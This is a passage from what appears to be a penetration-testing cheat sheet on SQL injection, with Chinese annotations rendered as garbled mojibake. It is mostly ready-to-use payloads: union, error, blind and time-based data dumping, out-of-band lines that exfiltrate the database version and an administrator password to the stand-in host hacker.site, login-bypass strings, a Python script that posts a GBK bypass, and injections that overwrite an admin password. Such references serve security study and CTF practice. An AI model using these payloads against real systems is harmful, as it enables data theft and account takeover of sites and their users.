<h3 id="æå–æ•°æ®åº“å-è¡¨å-å’Œ-å­—æ®µå"><a href="#æå–æ•°æ®åº“å-è¡¨å-å’Œ-å­—æ®µå" class="headerlink" title="æå–æ•°æ®åº“å,è¡¨å å’Œ å­—æ®µå"></a>æå–æ•°æ®åº“å,è¡¨å å’Œ å­—æ®µå</h3><p>åœ¨æ¥ä¸‹æ¥çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†è·å–æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€æ•°æ®åº“çš„è¡¨åã€è¡¨çš„å­—æ®µåï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Database names</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Tables of a database</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,gRoUp_cOncaT(<span class="number">0x7c</span>,table_name,<span class="number">0x7C</span>) <span class="keyword">fRoM</span> information_schema.tables <span class="keyword">wHeRe</span> table_schema<span class="operator">=</span>[database]</span><br><span class="line"></span><br><span class="line">#<span class="keyword">Column</span> names</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]</span></span><br></pre></td></tr></table></figure>

<p><em>åœ¨æ¯ä¸ªä¸åŒçš„æ•°æ®åº“ä¸­å‘ç°è¿™äº›æ•°æ®çš„æ–¹æ³•ä¸åŒï¼Œä½†æ–¹æ³•å§‹ç»ˆç›¸åŒã€‚</em></p>
<h2 id="åŸºäºéšè—çš„-union-æ³¨å…¥"><a href="#åŸºäºéšè—çš„-union-æ³¨å…¥" class="headerlink" title="åŸºäºéšè—çš„ union æ³¨å…¥"></a>åŸºäºéšè—çš„ union æ³¨å…¥</h2><p>å¦‚æœæ‚¨å¯ä»¥çœ‹è§æŸ¥è¯¢çš„è¾“å‡ºä½†æ— æ³•è¿›è¡Œ union çš„æ³¨å…¥ï¼Œåˆ™æ‚¨å¯èƒ½æ­£åœ¨é¢å¯¹åŸºäºéšè— union çš„æ³¨å…¥ã€‚<br>é€šå¸¸åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æœ€ç»ˆåªèƒ½è¿›è¡Œç›²æ³¨æ”»å‡»ã€‚è¦å°†ç›²æ³¨è½¬æ¢ä¸ºåŸºäº union çš„æ³¨å…¥ï¼Œæ‚¨éœ€è¦è·å–å½“å‰æŸ¥è¯¢è¯­å¥çš„åŸå‹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ç›²æ³¨çš„æ–¹å¼è·å–ï¼Œæ¯ä¸ªæ•°æ®åº“å‡æœ‰é»˜è®¤çš„è¡¨å­˜å‚¨ç€å½“å‰æ‰§è¡Œ SQL è¯­å¥ã€‚<br>æå– SQL æŸ¥è¯¢è¯­å¥åŸå‹åï¼Œæˆ‘ä»¬éœ€è¦ç›¸åº”åœ°è°ƒæ•´Payloadï¼Œå®‰å…¨åœ°é—­åˆåŸå§‹æŸ¥è¯¢ï¼Œç„¶åè¿›è¡Œ union æ³¨å…¥ã€‚</p>
<p><strong>åœ¨ MySQL ä¸­è·å–å½“å‰æ­£åœ¨æ‰§è¡Œçš„ SQL è¯­å¥</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> <span class="keyword">USER</span> <span class="operator">|</span> HOST            <span class="operator">|</span> DB   <span class="operator">|</span> COMMAND <span class="operator">|</span> <span class="type">TIME</span> <span class="operator">|</span> STATE     <span class="operator">|</span> INFO                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">87</span> <span class="operator">|</span> root <span class="operator">|</span> localhost:<span class="number">56330</span> <span class="operator">|</span> test <span class="operator">|</span> Query   <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> executing <span class="operator">|</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>

<p>Complete Article: <a target="_blank" rel="noopener" href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f</a></p>
<h2 id="Exploiting-Error-based"><a href="#Exploiting-Error-based" class="headerlink" title="Exploiting Error based"></a>Exploiting Error based</h2><p>If for some reason you <strong>cannot</strong> see the <strong>output</strong> of the <strong>query</strong> but you can <strong>see the error messages</strong>, <strong>you can make this error messages to <strong>ex-filtrate</strong> data from the database.ã€å¤§æ„ï¼šå®šåˆ¶é”™è¯¯æ¶ˆæ¯ï¼Œéœ€è¦åœ¨è§¦å‘æŠ¥é”™è¯­å¥ä¹‹å‰æ‰§è¡ŒæŸäº›è¯­å¥ï¼Œå¹¶å°†æ‰§è¡Œç»“æœæ‹¼æ¥åˆ°è§¦å‘çš„æŠ¥é”™è¯­å¥ä¸­ï¼Œé€šè¿‡æŠ¥é”™æ³„éœ²æ‰§è¡Œç»“æœã€‘</strong><br>Following a similar flow as in the Union Based exploitation you could manage to dump the DB.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">floor</span>() æŠ¥é”™åŸç†ï¼šhttps:<span class="operator">/</span><span class="operator">/</span>www.secpulse.com<span class="operator">/</span>archives<span class="operator">/</span><span class="number">140616.</span>html</span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(CONCAT(@<span class="variable">@VERSION</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x limit <span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>)y <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Blind-SQLi"><a href="#Exploiting-Blind-SQLi" class="headerlink" title="Exploiting Blind SQLi"></a>Exploiting Blind SQLi</h2><p>In this case you cannot see the results of the query or the errors, but you can <strong>distinguishedã€åŒºåˆ†ã€‘</strong> when the query <strong>return</strong> a <strong>true</strong> or a <strong>false</strong> response because there are different contents on the page.<br>In this case, you can <strong>abuseã€åˆ©ç”¨ã€‘</strong> that behaviour to dump the database char by char:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Error-Blind-SQLi"><a href="#Exploiting-Error-Blind-SQLi" class="headerlink" title="Exploiting Error Blind SQLi"></a>Exploiting Error Blind SQLi</h2><p>This is the <strong>same case as before</strong> but instead of distinguish between a true&#x2F;false response from the query you can <strong>distinguish between</strong> an <strong>error</strong> in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> IF(<span class="number">1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables),<span class="string">&#x27;a&#x27;</span>))<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Time-Based-SQLi"><a href="#Exploiting-Time-Based-SQLi" class="headerlink" title="Exploiting Time Based SQLi"></a>Exploiting Time Based SQLi</h2><p>In this case there <strong>isnâ€™t</strong> any way to <strong>distinguish</strong> the <strong>response</strong> of the query based on the context of the page. But, you can make the page <strong>take longer to load</strong> if the guessed character is correct. We have already saw this technique in use before in order to <a href="./#confirming-with-timing">confirm a SQLi vuln</a>.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> users <span class="keyword">where</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>)#</span><br></pre></td></tr></table></figure>

<h2 id="Stacked-Queries"><a href="#Stacked-Queries" class="headerlink" title="Stacked Queries"></a>Stacked Queries</h2><p>You can use stacked queries to <strong>execute multiple queries in successionã€è¿ç»­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢ã€‘</strong>. Note that while the subsequent queries are executed, the <strong>results</strong> are <strong>not returned to the application</strong>. <strong>Henceã€å› æ­¤ã€‘</strong> this technique is <strong>primarilyã€ä¸»è¦æ˜¯ã€‘</strong> of use in relation to <strong>blind vulnerabilities</strong> where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
<p><strong>Oracle</strong> doesnâ€™t support <strong>stacked queries.</strong> <strong>MySQL</strong>, <strong>Microsoft</strong> and <strong>PostgreSQL</strong> support them: <code>QUERY-1-HERE; QUERY-2-HERE</code></p>
<h2 id="Out-of-band-Exploitation"><a href="#Out-of-band-Exploitation" class="headerlink" title="Out of band Exploitation"></a>Out of band Exploitation</h2><p>If <strong>no-other</strong> exploitation method <strong>worked</strong>, you may try to make the database <strong>ex-filtrateã€æ³„éœ²ã€‘</strong> the info to an <strong>external hostã€å¤–éƒ¨ä¸»æœºã€‘</strong> controlled by you. For example, via DNS queries:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># MySQL</span><br><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,version(),<span class="string">&#x27;.hacker.site\\a.txt&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="Out-of-band-data-exfiltration-via-XXE"><a href="#Out-of-band-data-exfiltration-via-XXE" class="headerlink" title="Out of band data exfiltration via XXE"></a>Out of band data exfiltration via XXE</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Oracle</span><br><span class="line">a<span class="string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span>?xml version<span class="operator">=</span>&quot;1.0&quot; encoding<span class="operator">=</span>&quot;UTF-8&quot;?<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE root [ <span class="operator">&lt;</span><span class="operator">!</span>ENTITY <span class="operator">%</span> remote <span class="keyword">SYSTEM</span> &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.hacker.site/&quot;<span class="operator">&gt;</span> <span class="operator">%</span>remote;]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;) FROM dual-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="Automated-Exploitation"><a href="#Automated-Exploitation" class="headerlink" title="Automated Exploitation"></a>Automated Exploitation</h2><p>Check the <a href="sqlmap/">SQLMap Cheetsheat</a> to exploit a SQLi vulnerability with <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap"><strong>sqlmap</strong></a>.</p>
<h2 id="Tech-specific-info"><a href="#Tech-specific-info" class="headerlink" title="Tech specific info"></a>Tech specific info</h2><p>We have already discussed all the ways to exploit a SQLinjection vulnerability. Find some more tricks database technology dependant in this book:</p>
<ul>
<li><a href="mysql-injection/">MySQL</a></li>
<li><a href="postgresql-injection/">PostgreSQL</a></li>
</ul>
<p>Or you will find <strong>a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in</strong> <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</strong></a></p>
<h2 id="Authentication-bypass"><a href="#Authentication-bypass" class="headerlink" title="Authentication bypass"></a>Authentication bypass</h2><p>List to try to bypass the login functionality:</p>
<p>content-ref url&#x3D;â€..&#x2F;login-bypass&#x2F;sql-login-bypass.mdâ€<br><a href="../login-bypass/sql-login-bypass.md">sql-login-bypass.md</a><br>ndcontent-ref</p>
<h3 id="Authentication-Bypass-Raw-MD5"><a href="#Authentication-Bypass-Raw-MD5" class="headerlink" title="Authentication Bypass (Raw MD5)"></a>Authentication Bypass (Raw MD5)</h3><p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>Allowing an attacker to <strong>craft a stringã€åˆ¶ä½œä¸€ä¸ªå­—ç¬¦ä¸²ã€‘</strong> with a <code>true</code> statement such as <code>&#39; or &#39;SOMETHING</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;ffifdyop&quot;, <span class="literal">true</span>) <span class="operator">=</span> <span class="string">&#x27;or&#x27;</span><span class="number">6</span>Ã‰]Â™Ã©<span class="operator">!</span>r,Ã¹Ã­b</span><br></pre></td></tr></table></figure>

<p>Challenge demo available at <a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32772/">http://web.jarvisoj.com:32772</a></p>
<h3 id="Hash-Authentication-Bypass"><a href="#Hash-Authentication-Bypass" class="headerlink" title="Hash Authentication Bypass"></a>Hash Authentication Bypass</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; AND 1=0 UNION ALL SELECT &#x27;</span>admin<span class="string">&#x27;, &#x27;</span><span class="number">81</span>dc9bdb52d04dc20036dbd8313ed055<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Recommended list</strong>:</p>
<p>You should use as username each line of the list and as password always: _<strong>Pass1234.</strong>_<br><em>(This payloads are also included in the big list mentioned at the beginning of this section)</em></p>
<p>file src&#x3D;â€..&#x2F;..&#x2F;.gitbook&#x2F;assets&#x2F;sqli-hashbypass.txtâ€</p>
<h3 id="GBK-Authentication-Bypass"><a href="#GBK-Authentication-Bypass" class="headerlink" title="GBK Authentication Bypass"></a>GBK Authentication Bypass</h3><p>IF â€˜ is being scaped you can use %A8%27, and when â€˜ gets scaped it will be created: 0xA80x5c0x27 (<em>â•˜â€™</em>)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>A8<span class="operator">%</span><span class="number">27</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;<span class="comment">-- 2</span></span><br><span class="line"><span class="operator">%</span><span class="number">8</span>C<span class="operator">%</span>A8<span class="operator">%</span><span class="number">27</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- 2</span></span><br><span class="line"><span class="operator">%</span>bf<span class="string">&#x27; or 1=1 -- --</span></span><br></pre></td></tr></table></figure>

<p>Python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://example.com/index.php&quot;</span> </span><br><span class="line">cookies = <span class="built_in">dict</span>(PHPSESSID=<span class="string">&#x27;4j37giooed20ibi12f3dqjfbkp3&#x27;</span>) </span><br><span class="line">datas = &#123;<span class="string">&quot;login&quot;</span>: <span class="built_in">chr</span>(<span class="number">0xbf</span>) + <span class="built_in">chr</span>(<span class="number">0x27</span>) + <span class="string">&quot;OR 1=1 #&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125; </span><br><span class="line">r = requests.post(url, data = datas, cookies=cookies, headers=&#123;<span class="string">&#x27;referrer&#x27;</span>:url&#125;) </span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>

<h3 id="Polyglot-injectionã€å¤šè¯­å¢ƒæ³¨å…¥ã€‘-multicontext"><a href="#Polyglot-injectionã€å¤šè¯­å¢ƒæ³¨å…¥ã€‘-multicontext" class="headerlink" title="Polyglot injectionã€å¤šè¯­å¢ƒæ³¨å…¥ã€‘ (multicontext)"></a>Polyglot injectionã€å¤šè¯­å¢ƒæ³¨å…¥ã€‘ (multicontext)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLEEP(<span class="number">1</span>) <span class="comment">/*&#x27; or SLEEP(1) or &#x27;&quot; or SLEEP(1) or &quot;*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Insert-Statement"><a href="#Insert-Statement" class="headerlink" title="Insert Statement"></a>Insert Statement</h2><h3 id="Modify-password-of-existing-object-x2F-user"><a href="#Modify-password-of-existing-object-x2F-user" class="headerlink" title="Modify password of existing object&#x2F;user"></a>Modify password of existing object&#x2F;user</h3><p>To do so you should try to <strong>create a new object named as the â€œmaster objectâ€</strong> (probably <strong>admin</strong> in case of users) modifying something:</p>
<ul>
<li>Create user named: <strong>AdMIn</strong> (uppercase &amp; lowercase letters)</li>
<li>Create a user named: <strong>admin&#x3D;</strong></li>
<li><strong>SQL Truncation Attackã€sqlæˆªæ–­æ”»å‡»ã€‘</strong> (when there is some kind of <strong>length limit</strong> in the username or email) â€“&gt; Create user with name: <strong>admin [a lot of spaces] a</strong></li>
</ul>
<h4 id="SQL-Truncation-Attack"><a href="#SQL-Truncation-Attack" class="headerlink" title="SQL Truncation Attack"></a>SQL Truncation Attack</h4><p>If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user <strong>admin</strong>, try to create a username called: â€œ<em>admin [30 spaces] a</em>â€œ and any password.</p>
<p>The database will <strong>check</strong> if the introduced <strong>username</strong> <strong>exists</strong> inside the database. If <strong>not</strong>, it will <strong>cut</strong> the <strong>username</strong> to the <strong>max allowed number of characters</strong> (in this case to: â€œ<em>admin [25 spaces]</em>â€œ) and the it will <strong>automatically remove all the spaces at the end updating</strong> inside the database the user â€œ<strong>admin</strong>â€œ with the <strong>new password</strong> (some error could appear but it doesnâ€™t means that this hasnâ€™t worked).</p>
<p>More info: <a target="_blank" rel="noopener" href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html</a> &amp; <a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/sql-truncation-attack/#gref">https://resources.infosecinstitute.com/sql-truncation-attack/#gref</a></p>
<p><em>Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check</em> <a target="_blank" rel="noopener" href="https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation"><em>https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation</em></a>__</p>
<h3 id="MySQL-Insert-time-based-checking"><a href="#MySQL-Insert-time-based-checking" class="headerlink" title="MySQL Insert time based checking"></a>MySQL Insert time based checking</h3><p><strong>Add as much <code>&#39;,&#39;&#39;,&#39;&#39;</code> as you consider to exit the VALUES statementã€å¤§æ„ï¼šæ·»åŠ è¶³å¤Ÿçš„ <code>&#39;,&#39;&#39;,&#39;&#39;</code>ï¼Œç”¨ä»¥é—­åˆ VALUES è¯­å¢ƒã€‘</strong>. If delay is executed, you have a SQLInjection.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="string">&#x27;,&#x27;&#x27;);WAITFOR%20DELAY%20&#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">5</span><span class="string">&#x27;--%20-</span></span><br></pre></td></tr></table></figure>

<h3 id="ON-DUPLICATE-KEY-UPDATE"><a href="#ON-DUPLICATE-KEY-UPDATE" class="headerlink" title="ON DUPLICATE KEY UPDATE"></a>ON DUPLICATE KEY UPDATE</h3><p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Inject using payload:</span><br><span class="line">attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; --</span><br><span class="line"></span><br><span class="line">The query would look like this:</span><br><span class="line">INSERT INTO users (email, password) VALUES (&quot;attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; -- &quot;, &quot;bcrypt_hash_of_your_password_input&quot;);</span><br><span class="line"></span><br><span class="line">This query will insert a row for the user â€œattacker_dummy@example.comâ€. It will also insert a row for the user â€œadmin@example.comâ€.</span><br><span class="line">Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to &quot;bcrypt_hash_of_qwerty&quot;.</span><br><span class="line"></span><br><span class="line">After this, we can simply authenticate with â€œadmin@example.comâ€ and the password â€œqwertyâ€!</span><br></pre></td></tr></table></figure>

<h3 id="Extract-information"><a href="#Extract-information" class="headerlink" title="Extract information"></a>Extract information</h3><h4 id="Creating-2-accounts-at-the-same-time"><a href="#Creating-2-accounts-at-the-same-time" class="headerlink" title="Creating 2 accounts at the same time"></a>Creating 2 accounts at the same time</h4><p>When trying to create a new user and username, password and email are needed:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQLi payload:</span><br><span class="line">username=TEST&amp;password=TEST&amp;email=TEST&#x27;),(&#x27;otherUsername&#x27;,&#x27;otherPassword&#x27;,(select flag from flag limit 1))-- -</span><br><span class="line"></span><br><span class="line">A new user with username=otherUsername, password=otherPassword, email:FLAG will be created</span><br></pre></td></tr></table></figure>

<h4 id="Using-decimal-or-hexadecimal"><a href="#Using-decimal-or-hexadecimal" class="headerlink" title="Using decimal or hexadecimal"></a>Using decimal or hexadecimal</h4><p>With this technique you can extract information creating only 1 account. It is important to note that you donâ€™t need to comment anything.</p>
<p>Using <strong>hex2dec</strong> and <strong>substr</strong>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>To get the text you can use:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>).unhexlify(<span class="built_in">hex</span>(<span class="number">215573607263</span>)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>Using <strong>hex</strong> and <strong>replace</strong> (and <strong>substr</strong>):</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(table_name,&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br><span class="line"></span><br><span class="line">#<span class="keyword">Full</span> ascii uppercase <span class="keyword">and</span> lowercase replace:</span><br><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;),&quot;z&quot;,&quot;&amp;&quot;),&quot;J&quot;,&quot;&#x27;</span>&quot;),&quot;K&quot;,&quot;`&quot;),&quot;L&quot;,&quot;(&quot;),&quot;M&quot;,&quot;)&quot;),&quot;N&quot;,&quot;@&quot;),&quot;O&quot;,&quot;$$&quot;),&quot;Z&quot;,&quot;<span class="operator">&amp;&amp;</span>&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Routed-SQL-injection"><a href="#Routed-SQL-injection" class="headerlink" title="Routed SQL injection"></a>Routed SQL injection</h2><p>Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. (<a target="_blank" rel="noopener" href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">Paper</a>)<br><strong>â€œRouted SQL injectionâ€</strong> æƒ…å†µä¸ <strong>â€œExploiting Hidden Union Basedâ€</strong> ä»‹ç»æ–‡ç« ç¬¬ä¸‰ç§æƒ…å†µä¸€æ ·ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">Paper</a> ä¸­çš„æ¼”ç¤ºä»£ç ï¼š</p>
